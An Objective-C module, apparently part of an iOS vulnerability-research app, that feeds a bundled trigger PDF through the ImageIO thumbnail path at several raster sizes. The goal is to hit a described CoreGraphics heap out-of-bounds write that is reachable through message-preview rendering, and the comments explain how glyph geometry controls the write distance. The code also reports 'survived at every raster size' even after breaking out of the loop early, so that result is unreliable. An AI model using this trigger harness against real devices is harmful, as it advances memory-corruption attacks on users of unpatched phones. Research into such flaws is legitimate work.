#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <ImageIO/ImageIO.h>
#import <CoreGraphics/CoreGraphics.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// CVE-2026-86950 — CoreGraphics heap OOB write in aa_cache_render, reached
// through CGImageSourceCreateThumbnailAtIndex (the Messages/WhatsApp preview
// path).  Fixed in 26.7.1 — our build is 26.2b1, so it is present.
//
// The local research (Default Project\cve86950) verified the arithmetic: the
// OOB distance is 4*(width_px + K) bytes BEFORE the coverage buffer, with
// width_px = 64*dx — i.e. the write distance is fully controlled by the glyph
// geometry (dx, K), and the write goes BEFORE the row buffer.
//
// This module drives the ImageIO thumbnail path exactly like render.c does:
// no CGContext of our own, no font smoothing calls — ImageIO's internal render
// context is what reaches the vulnerable code.  A canary brackets each call so
// a process that never returns leaves the exact file it died on.
// ===========================================================================
static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
    NSString *path = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:pdfName];
    if (![[NSFileManager defaultManager] fileExistsAtPath:path])
        return [NSString stringWithFormat:@"%@: %@ not in the bundle", tag, pdfName];

    NSURL *url = [NSURL fileURLWithPath:path];
    CGImageSourceRef src = CGImageSourceCreateWithURL((CFURLRef)url, NULL);
    if (!src) return [NSString stringWithFormat:@"%@: CGImageSourceCreateWithURL failed", tag];

    int sz = maxPx;
    CFNumberRef px = CFNumberCreate(NULL, kCFNumberIntType, &sz);
    CFStringRef k[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                        kCGImageSourceThumbnailMaxPixelSize };
    CFTypeRef   v[] = { kCFBooleanTrue, px };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, (const void **)k, (const void **)v, 2,
                                              &kCFTypeDictionaryKeyCallBacks,
                                              &kCFTypeDictionaryValueCallBacks);
    CFRelease(px);

    AvePost([NSString stringWithFormat:@"%@ BEFORE thumbnail of %@ (max %d px)",
             tag, pdfName, maxPx]);
    CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);   // <-- the write
    CFRelease(opts);

    NSString *res;
    if (img) {
        size_t w = CGImageGetWidth(img), h = CGImageGetHeight(img);
        res = [NSString stringWithFormat:@"%@: thumbnail OK %zux%zu (no fault)", tag, w, h];
        AvePost([NSString stringWithFormat:@"%@ canary AFTER thumbnail (survived)", tag]);
        CFRelease(img);
    } else {
        res = [NSString stringWithFormat:@"%@: thumbnail returned NULL (no fault)", tag];
    }
    CFRelease(src);
    return res;
}

NSString *ModCVE86950(void) {
    AveLog(@"    CVE-2026-86950: ImageIO PDF thumbnail OOB (fixed only in 26.7.1)");
    AvePost(@"86950 start");

    // control first: a plain page with no font must thumbnail cleanly
    NSString *ctl = ModThumbPDF(@"control_86950.pdf", @"86950-CTL", 256);
    AvePost([NSString stringWithFormat:@"86950CTL %@", ctl]);
    if (![ctl containsString:@"OK"] && ![ctl containsString:@"NULL"]) {
        AvePost(@"86950 verdict: CONTROL failed — the thumbnail path is broken, not the bug");
        return [NSString stringWithFormat:@"86950: CONTROL failed (%@)", ctl];
    }

    // the trigger: the verified-geometry font at Tf=1024, at increasing raster
    // sizes (bigger raster = wider coverage buffer = different OOB distance).
    int sizes[] = { 32, 64, 128, 256, 512, 1024 };
    for (int i = 0; i < 6; i++) {
        NSString *r = ModThumbPDF(@"trigger_86950.pdf",
                                  [NSString stringWithFormat:@"86950-T%d", sizes[i]],
                                  sizes[i]);
        AvePost([NSString stringWithFormat:@"86950 %@", r]);
        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) break;
    }

    AvePost(@"86950 done: the thumbnail path survived at every raster size");
    return @"86950: thumbnail path survived at every raster size (no OOB fault)";
}